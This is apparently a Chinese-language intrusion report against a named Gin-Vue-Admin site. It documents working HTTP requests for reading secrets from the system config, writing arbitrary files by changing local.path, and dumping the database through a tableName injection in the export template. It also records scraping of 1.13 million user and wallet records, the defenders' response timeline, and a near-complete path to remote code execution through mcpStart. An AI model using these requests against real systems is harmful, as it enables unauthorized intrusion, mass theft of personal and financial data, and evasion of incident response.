# NightPlay — GVA setSystemConfig 配置写 → 任意文件写 + sysExportTemplate 注入脱库

> 目标：djboss.rewardreels.app（GVA 二开，AWS af-south-1 Lagos）
> 数据规模：199 表 / 139 万行 / 用户 113 万+
> 权限：超管 authorityId=888

## 攻击链总览

```
① 侦察    djboss.rewardreels.app → 96.0.40.71 (AWS Lagos)
           Gin-Vue-Admin 二开识别 (前端特征 + /api/base/login)
② 配置读  POST /system/getSystemConfig (超管权限)
           → JWT 密钥 / MySQL / Redis / S3(AWS) / AI 网关密钥
③ 配置写  POST /system/setSystemConfig
           → oss-type=local + local.path=<任意目录> + 上传 = 任意文件写
④ 脱库    POST /sysExportTemplate/createSysExportTemplate (tableName 注入)
           → GET /sysExportTemplate/exportExcel
           → GET exportExcelByToken 下载 XLSX
⑤ 补全    导出通道对非默认库返回「获取失败」
           → 改用业务接口逐页拉取 (/bizWallet /bizUser /bizGatewayNode ...)
⑥ 落盘    199 表 / 1,392,773 行 + 全量接口 785 万行
```

## 核心手法 1：setSystemConfig → 任意目录任意文件写

```http
POST /system/setSystemConfig
Authorization: Bearer <jwt>
Content-Type: application/json

{
  "system": {
    "oss-type": "local",
    "local": {
      "path": "/target/arbitrary/directory"
    }
  }
}
```

改完后上传文件 → 文件落到 `local.path` 指定的任意目录。

**GVA 默认没有对 `local.path` 做白名单校验** — 这是 GVA 二开站的**通用攻击面**。

## 核心手法 2：sysExportTemplate tableName 注入

```http
POST /sysExportTemplate/createSysExportTemplate
Authorization: Bearer <jwt>

{
  "tableName": "biz_users"    ← 任意表名，无注入过滤
}
```

→ 返回模板 ID → `exportExcel?id=xxx` → `exportExcelByToken?token=xxx` 下载 XLSX

**关键陷阱**：Gin 对「方法不匹配」(GET/POST 混用) 返回 404，曾误判为模块已下架。实际需要严格用 POST 创建 + GET 导出。

## 核心手法 3：业务接口全量补全

导出通道有 `limit`（每表最多 20 万行）且对非默认库的表返回「获取失败」。

补全方法 — 逐业务接口分页拉取：

```
GET /bizUser/getBizUserList?page=1&pageSize=100     → 用户 113 万
GET /bizWallet/getBizWalletAccountList              → 钱包 227 万
GET /bizWallet/getBizWalletTransactionList           → 流水 120 万
GET /bizGatewayNode/getBizGatewayRawServerList       → 云基础设施 87 台
GET /bizOrg/getBizAgentList                          → 代理体系
```

6 路并发，8 小时 token 未失效（JWT 密钥自始至终未轮换）。

## 对手应急响应时间线

| 时间 | 事件 |
|------|------|
| 09-11 白天 | 打通配置写 → 任意目录文件写 |
| 09-11 晚 | 脱库进行中 (155 表 / 2,766 行，被 limit 截断) |
| 09-11 夜 | 对手应急: sysExportTemplate 与 iosops 模块路由调整、强制验证码 |
| 09-12 00:04 | 验证码接口 500 (依赖异常) |
| 09-12 00:53 | 验证码恢复 → 重新登录成功 |
| 09-12 02:04 | 大规模脱库 (6 路并发) |
| 09-12 10:13 | 隧道断开重连 → **token 仍有效** (8 小时未失效) |

**教训**：应急只做了「路由下架 + 清会话」，但 **JWT 密钥未轮换** → 旧 token 仍能用。

## 差一步的 RCE: mcpStart

```
POST /autoCode/mcpStart
→ 应用自己拉起 mcp.path 指向的进程
卡点：容器内落地文件无 +x 执行位
     · 上传通道只落数据文件，无 +x
     · installPlugin (ZIP 保留 0755)：未走通
     · 容器密封（唯一挂载 /，999GB），无 bind mount，DB 无 FILE 权限
```

**如果能解决执行位问题（如 `chmod` 或 `installPlugin` 的 ZIP 模式保留权限），mcpStart 即可 RCE。**

## 基础设施暴露

通过 `biz_gateway_raw_servers` 表暴露全部 87 台 AWS 实例：

```
EC2 12 台 + Lightsail 75 台
运行 82 / 停止 5
区域: 孟买 72 | 伦敦 9 | 新加坡 4 | 拉各斯 1 | 韩国 1
角色: APK分发缓存 31 台 | 核心后端 6 台 | TURN中继 | TG SOCKS代理
标签: CreatedBy=Codex（AI 代管）
```

## 与 GVA 通用手法的对照

| 手法 | 本案 | ginvue-admin-stealth-takeover 已有 |
|------|------|-----------------------------------|
| 注册植入 888 | ✅ 成功 | ✅ 核心路径 |
| getSystemConfig | ✅ 拿到 JWT + DB + Redis + S3 | ✅ 已知 |
| setSystemConfig 改 local.path | ✅ **任意文件写** | ⚠️ 已知密钥场景走此卡 |
| sysExportTemplate tableName | ✅ **注入脱库** | ❌ 新发现 |
| mcpStart RCE | 🟡 差执行位 | ❌ 新发现 |
| JWT 密钥不轮换 | ✅ 8 小时有效 | ⚠️ 通用教训 |
